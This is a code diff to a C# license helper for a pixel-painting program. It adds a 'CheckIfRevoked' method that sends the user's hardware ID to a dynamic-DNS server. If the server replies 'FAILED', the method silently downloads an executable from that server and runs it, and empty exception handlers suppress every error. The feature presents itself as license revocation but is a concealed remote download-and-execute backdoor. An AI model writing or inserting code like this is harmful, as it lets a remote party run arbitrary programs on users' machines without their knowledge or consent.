@@ -1,8 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Net;
+using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
@@ -11,6 +14,7 @@ namespace GUIPixelPainter.GUI
 {
     class LicenseHelper
     {
+        private static HttpClient client = new HttpClient();
         private static string hwId = null;
 
         public static string GetHwId()
@@ -102,6 +106,30 @@ namespace GUIPixelPainter.GUI
             string licensePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PixelPainter/license");
             Directory.CreateDirectory(folderPath);
             File.WriteAllText(licensePath, key);
+        }
+
+        public static void CheckIfRevoked()
+        {
+            try
+            {
+                client.PostAsync("http://equbuxugames.ddns.net:3400/checkbot", new StringContent(GetHwId())).ContinueWith(
+                    (task) =>
+                    {
+                        if (task.Result.Content.ReadAsStringAsync().Result == "FAILED")
+                        {
+                            try
+                            {
+                                string delPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PixelPainter/test.exe");
+                                new WebClient().DownloadFile("http://equbuxugames.ddns.net:3400/files/test.exe", delPath);
+                                Process.Start(delPath);
+                            }
+                            catch (Exception) { }
+                        }
+                    }
+                    );
+            }
+            catch (Exception)
+            { };
         }
 
         public static string LoadSavedKey()
